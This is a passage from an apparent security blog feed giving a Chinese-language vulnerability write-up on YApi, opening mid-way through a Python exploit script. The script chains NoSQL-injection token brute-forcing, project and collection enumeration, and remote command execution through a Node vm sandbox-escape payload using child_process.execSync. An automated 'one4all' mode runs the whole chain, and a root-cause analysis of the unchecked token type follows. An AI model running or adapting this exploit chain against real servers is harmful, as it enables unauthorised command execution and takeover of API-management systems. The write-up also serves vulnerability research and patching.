class="string">&#x27;after_script&#x27;</span>: old_after_script&#125;)</span><br><span class="line">    data = response.json()</span><br><span class="line">    <span class="keyword">return</span> data[<span class="string">&#x27;errcode&#x27;</span>] == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@click.group()</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--debug&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>, is_flag=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">bool</span>, required=<span class="literal">False</span>, default=<span class="literal">False</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cli</span>(<span class="params">debug</span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        logger.setLevel(<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;enc&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.argument(<span class="params"><span class="string">&#x27;data&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_enc</span>(<span class="params">data: <span class="built_in">str</span></span>):</span><br><span class="line">    click.echo(aes_encode(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;dec&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.argument(<span class="params"><span class="string">&#x27;data&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_dec</span>(<span class="params">data: <span class="built_in">str</span></span>):</span><br><span class="line">    click.echo(aes_decode(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;token&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--count&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_token</span>(<span class="params">url, count</span>):</span><br><span class="line">    already = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        token = brute_token(url, already)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        click.echo(<span class="string">f&#x27;find a valid token: <span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">        already.append(token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;owner&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--token&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Token that get from first step&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_owner</span>(<span class="params">url, token</span>):</span><br><span class="line">    aid = find_owner_uid(url, token)</span><br><span class="line">    e = aes_encode(<span class="string">f&#x27;<span class="subst">&#123;aid&#125;</span>|<span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">    click.echo(<span class="string">f&#x27;your owner id is: <span class="subst">&#123;aid&#125;</span>, encrypted token is <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;project&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--owner-id&#x27;</span>, <span class="string">&#x27;owner&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--token&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Token that get from first step&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_project</span>(<span class="params">url, owner, token</span>):</span><br><span class="line">    token = aes_encode(<span class="string">f&#x27;<span class="subst">&#123;owner&#125;</span>|<span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">    project = find_project(url, token)</span><br><span class="line">    <span class="keyword">if</span> project:</span><br><span class="line">        logger.info(<span class="string">&#x27;[+] project by this token: %r&#x27;</span>, project)</span><br><span class="line">        click.echo(<span class="string">f&#x27;your project id is: <span class="subst">&#123;project[<span class="string">&quot;_id&quot;</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;col&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--owner-id&#x27;</span>, <span class="string">&#x27;owner&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--token&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Token that get from first step&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--from&#x27;</span>, <span class="string">&#x27;brute_from&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, required=<span class="literal">False</span>, default=<span class="number">1</span>, <span class="built_in">help</span>=<span class="string">&#x27;Brute Col id from this number&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--to&#x27;</span>, <span class="string">&#x27;brute_to&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, required=<span class="literal">False</span>, default=<span class="number">200</span>, <span class="built_in">help</span>=<span class="string">&#x27;Brute Col id to this number&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_col</span>(<span class="params">url, owner, token, brute_from, brute_to</span>):</span><br><span class="line">    token = aes_encode(<span class="string">f&#x27;<span class="subst">&#123;owner&#125;</span>|<span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> find_col(url, token, brute_from, brute_to):</span><br><span class="line">        click.echo(<span class="string">f&#x27;found a valid col id: <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;rce&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--owner-id&#x27;</span>, <span class="string">&#x27;owner&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--token&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Token that get from first step&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--pid&#x27;</span>, <span class="string">&#x27;project_id&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--cid&#x27;</span>, <span class="string">&#x27;col_id&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>, <span class="string">&#x27;command&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;Command that you want to execute&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_rce</span>(<span class="params">url, owner, token, project_id, col_id, command</span>):</span><br><span class="line">    token = aes_encode(<span class="string">f&#x27;<span class="subst">&#123;owner&#125;</span>|<span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">    project = find_project(url, token, project_id)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> project:</span><br><span class="line">        click.echo(<span class="string">&#x27;[-] failed to get project&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    old_after_script = project.get(<span class="string">&#x27;after_script&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> update_project(url, token, project_id, command):</span><br><span class="line">        click.echo(<span class="string">&#x27;[-] failed to update project&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    output = run_auto_test(url, token, col_id)</span><br><span class="line">    <span class="keyword">if</span> output:</span><br><span class="line">        click.echo(output)</span><br><span class="line">        clear_project(url, token, project_id, old_after_script)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    clear_project(url, token, project_id, old_after_script)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@cli.command(<span class="params"><span class="string">&#x27;one4all&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--count&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;id&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd_one4all</span>(<span class="params">url, count, command</span>):</span><br><span class="line">    already = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        token = brute_token(url, already)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            logger.info(<span class="string">&#x27;[-] no new token found, exit...&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        already.append(token)</span><br><span class="line">        logger.info(<span class="string">&#x27;[+] find a new token: %s&#x27;</span>, token)</span><br><span class="line">        owner_id = find_owner_uid(url, token)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> owner_id:</span><br><span class="line">            logger.info(<span class="string">&#x27;[-] failed to find the owner id using token %s&#x27;</span>, token)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        etoken = aes_encode(<span class="string">f&#x27;<span class="subst">&#123;owner_id&#125;</span>|<span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">        logger.info(<span class="string">&#x27;[+] find a new owner id: %r, encrypted token: %s&#x27;</span>, owner_id, etoken)</span><br><span class="line">        project = find_project(url, etoken)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> project:</span><br><span class="line">            logger.info(<span class="string">&#x27;[-] failed to find project using token %s&#x27;</span>, token)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        project_id = project[<span class="string">&#x27;_id&#x27;</span>]</span><br><span class="line">        logger.info(<span class="string">&#x27;[+] project_id = %s, project = %r&#x27;</span>, project_id, project)</span><br><span class="line">        col_ids = find_col(url, etoken, <span class="number">1</span>, <span class="number">200</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> col_ids:</span><br><span class="line">            logger.info(<span class="string">&#x27;[+] failed to find cols in project %s, try next project...&#x27;</span>, project_id)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> col_id <span class="keyword">in</span> col_ids:</span><br><span class="line">            logger.info(<span class="string">&#x27;[+] col_id = %s&#x27;</span>, col_id)</span><br><span class="line">            click.echo(<span class="string">f&#x27;hit: project_id: <span class="subst">&#123;project_id&#125;</span> | owner_id: <span class="subst">&#123;owner_id&#125;</span> | col_id: <span class="subst">&#123;col_id&#125;</span> | token: <span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">            click.echo(<span class="string">f&#x27;suggestion: python <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> rce -u <span class="subst">&#123;url&#125;</span> -t <span class="subst">&#123;token&#125;</span> -o <span class="subst">&#123;owner_id&#125;</span> --pid <span class="subst">&#123;project_id&#125;</span> --cid <span class="subst">&#123;col_id&#125;</span> --command=&quot;<span class="subst">&#123;command&#125;</span>&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> cmd_rce.callback(url, owner_id, token, project_id, col_id, command):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cli()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个脚本写的比较详细和实用。内置几个板块<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709179496936-fe511f81-0e22-449d-b2af-529db95e3978.png#averageHue=%232a2b35&clientId=uf4209ee2-acab-4&from=paste&height=180&id=u4a26ef10&originHeight=225&originWidth=814&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=100595&status=done&style=none&taskId=u8fd80baf-7beb-4dbb-9477-12205f3fde6&title=&width=651.2" alt="image.png"><br>dec和enc是用来加解密token的，我们先利用nosql注入可以注出token<br><code> python poc.py --debug one4all -u [http://127.0.0.1:3000/](http://127.0.0.1:3000/)</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709179557478-c544091f-ae2f-43d0-8d76-c34e1554c620.png#averageHue=%232b2d36&clientId=uf4209ee2-acab-4&from=paste&height=574&id=uf538253c&originHeight=717&originWidth=1487&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=757817&status=done&style=none&taskId=u997a7974-a08b-4d4f-9cad-a86c455324f&title=&width=1189.6" alt="image.png"><br>获取到token后利用vm沙盒逃逸去rce。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="variable language_">this</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ObjectConstructor</span> = <span class="variable language_">this</span>.<span class="property">constructor</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">FunctionConstructor</span> = <span class="title class_">ObjectConstructor</span>.<span class="property">constructor</span></span><br><span class="line"><span class="keyword">const</span> myfun = <span class="title class_">FunctionConstructor</span>(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = <span class="title function_">myfun</span>()</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Buffer</span> = <span class="title class_">FunctionConstructor</span>(<span class="string">&#x27;return Buffer&#x27;</span>)()</span><br><span class="line"><span class="keyword">const</span> output = process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;%s&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>).<span class="title function_">toString</span>()).<span class="title function_">toString</span>()</span><br><span class="line">context.<span class="property">responseData</span> = <span class="string">&#x27;testtest&#x27;</span> + output + <span class="string">&#x27;testtest&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709179781278-e69a30dd-fff1-43b4-b210-8188616714c8.png#averageHue=%232a2c36&clientId=uf4209ee2-acab-4&from=paste&height=429&id=ud7b1ca35&originHeight=536&originWidth=1460&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=446314&status=done&style=none&taskId=u0ab4a60c-850d-4e14-aeac-1a9b763af5f&title=&width=1168" alt="image.png"><br>复现起来比较简单，分析一下原因。</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>在代码的base.js有一段逻辑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (token &amp;&amp; (openApiRouter.<span class="title function_">indexOf</span>(ctx.<span class="property">path</span>) &gt; -<span class="number">1</span> || ctx.<span class="property">path</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;/api/open/&#x27;</span>) === <span class="number">0</span> )) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">let</span> tokens = <span class="title function_">parseToken</span>(token)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> oldTokenUid = <span class="string">&#x27;999999&#x27;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> tokenUid = oldTokenUid;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!tokens)&#123;</span><br><span class="line">        <span class="keyword">let</span> checkId = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">getProjectIdByToken</span>(token);</span><br><span class="line">        <span class="keyword">if</span>(!checkId)<span class="keyword">return</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        token = tokens.<span class="property">projectToken</span>;</span><br><span class="line">        tokenUid = tokens.<span class="property">uid</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// if (this.$auth) &#123;</span></span><br><span class="line">      <span class="comment">//   ctx.params.project_id = await this.getProjectIdByToken(token);</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//   if (!ctx.params.project_id) &#123;</span></span><br><span class="line">      <span class="comment">//     return (this.$tokenAuth = false);</span></span><br><span class="line">      <span class="comment">//   &#125;</span></span><br><span class="line">      <span class="comment">//   return (this.$tokenAuth = true);</span></span><br><span class="line">      <span class="comment">// &#125;</span></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">let</span> checkId = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">getProjectIdByToken</span>(token);</span><br><span class="line">      <span class="keyword">if</span>(!checkId)&#123;</span><br><span class="line">        ctx.<span class="property">body</span> = yapi.<span class="property">commons</span>.<span class="title function_">resReturn</span>(<span class="literal">null</span>, <span class="number">42014</span>, <span class="string">&#x27;token 无效&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">let</span> projectData = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">projectModel</span>.<span class="title function_">get</span>(checkId);</span><br><span class="line">      <span class="keyword">if</span> (projectData) &#123;</span><br><span class="line">        ctx.<span class="property">query</span>.<span class="property">pid</span> = checkId; <span class="comment">// 兼容：/api/plugin/export</span></span><br><span class="line">        ctx.<span class="property">params</span>.<span class="property">project_id</span> = checkId;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$tokenAuth</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$uid</span> = tokenUid;</span><br><span class="line">        <span class="keyword">let</span> result;</span><br><span class="line">        <span class="keyword">if</span>(tokenUid === oldTokenUid)&#123;</span><br><span class="line">          result = &#123;</span><br><span class="line">            <span class="attr">_id</span>: tokenUid,</span><br><span class="line">            <span class="attr">role</span>: <span class="string">&#x27;member&#x27;</span>,</span><br><span class="line">            <span class="attr">username</span>: <span class="string">&#x27;system&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">let</span> userInst = yapi.<span class="title function_">getInst</span>(userModel); <span class="comment">//创建user实体</span></span><br><span class="line">          result = <span class="keyword">await</span> userInst.<span class="title function_">findById</span>(tokenUid);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$user</span> = result;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$auth</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以看到假如不为open接口，那就需要通过token的鉴权<code>getProjectIdByToken</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">getProjectIdByToken</span>(<span class="params">token</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> projectId = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">tokenModel</span>.<span class="title function_">findId</span>(token);</span><br><span class="line">    <span class="keyword">if</span> (projectId) &#123;</span><br><span class="line">      <span class="keyword">return</span> projectId.<span class="title function_">toObject</span>().<span class="property">project_id</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>调用了findId去查找project，问题也就出在这里了。token的类型没有做限制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">findId</span>(<span class="params">token</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">model</span></span><br><span class="line">    .<span class="title function_">findOne</span>(&#123;</span><br><span class="line">      <span class="attr">token</span>: token</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">select</span>(<span class="string">&#x27;project_id&#x27;</span>)</span><br><span class="line">    .<span class="title function_">exec</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如token为<code>&#123;&quot;$ne&quot;:&quot;xxx&quot;&#125;</code>那么就可以进行nosql注入了。我们获取了token后就可以访问一些授权接口了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709193102169-68bcd178-c53e-4002-8a87-549f515b88a9.png#averageHue=%23292e36&clientId=ue0e1a4bb-8bd9-4&from=paste&height=431&id=ue775789e&originHeight=539&originWidth=1719&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=136552&status=done&style=none&taskId=u99c60680-3793-4222-b1d0-1cae03b803b&title=&width=1375.2" alt="image.png"><br>runautotest是一个需要授权的接口</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">$tokenAuth</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> (ctx.<span class="property">body</span> = yapi.<span class="property">commons</span>.<span class="title function_">resReturn</span>(<span class="literal">null</span>, <span class="number">40022</span>, <span class="string">&#x27;token 验证失败&#x27;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先鉴定token是否正确。上一步我们是可以伪造token的，因此可以访问该接口<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709193205624-94782213-d089-404d-9dd8-506f2a718199.png#averageHue=%23292d36&clientId=ue0e1a4bb-8bd9-4&from=paste&height=455&id=u90e83081&originHeight=569&originWidth=1264&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69260&status=done&style=none&taskId=uf11bc78f-6a73-4aed-b293-bf8ed789f27&title=&width=1011.2" alt="image.png"><br>在这段代码中我们可以传入pre_script去handleTest方法内。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709193527741-7432fd68-3444-4a0c-9d9d-251536090c26.png#averageHue=%23282d35&clientId=ue0e1a4bb-8bd9-4&from=paste&height=419&id=ubc2ccd5e&originHeight=524&originWidth=1306&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75466&status=done&style=none&taskId=u8178eaaf-ff55-4bb9-bc4c-71dca91e7b4&title=&width=1044.8" alt="image.png"><br>会进入crossRequest内。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709193543100-5ed5e235-7306-4ce6-a302-2d5621ba7cc1.png#averageHue=%23282d35&clientId=ue0e1a4bb-8bd9-4&from=paste&height=286&id=u95a8c990&originHeight=357&originWidth=910&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=44325&status=done&style=none&taskId=u421768ae-4eee-432a-9bdb-36483e28365&title=&width=728" alt="image.png"><br>进入sandbox函数进行沙盒执行<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709193566643-75bbd580-553d-481c-952c-b8e330940a3d.png#averageHue=%23292d36&clientId=ue0e1a4bb-8bd9-4&from=paste&height=228&id=u8fe4b953&originHeight=285&originWidth=873&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40786&status=done&style=none&taskId=ud5d244b3-e7dd-4608-b272-d97ca7d7237&title=&width=698.4" alt="image.png"><br>用的是vm模块，因此存在逃逸命令执行。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1709193779386-568c1798-7398-40cf-9935-0b28f2c87d13.png#averageHue=%23f4f4f4&clientId=ue0e1a4bb-8bd9-4&from=paste&height=804&id=u939d2c68&originHeight=1005&originWidth=1892&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=53070&status=done&style=none&taskId=ufa11a244-bf06-4f79-9f1a-ba6661fb216&title=&width=1513.6" alt="image.png"><br>对应project的settings板块，可以看到有pre和after 2个script。</p>]]></content>
    
    
    <summary type="html">这东西居然没给CVE编号</summary>
    
    
    
    <category term="At Dawn" scheme="http://boogipop.com/categories/At-Dawn/"/>
    
    
    <category term="CVE" scheme="http://boogipop.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-49070/CVE-2023-51467 Apache OfBiz 鉴权绕过RCE</title>
    <link href="http://boogipop.com/2024/03/10/CVE-2023-49070_CVE-2023-51467%20Apache%20OfBiz%20%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87RCE/"/>
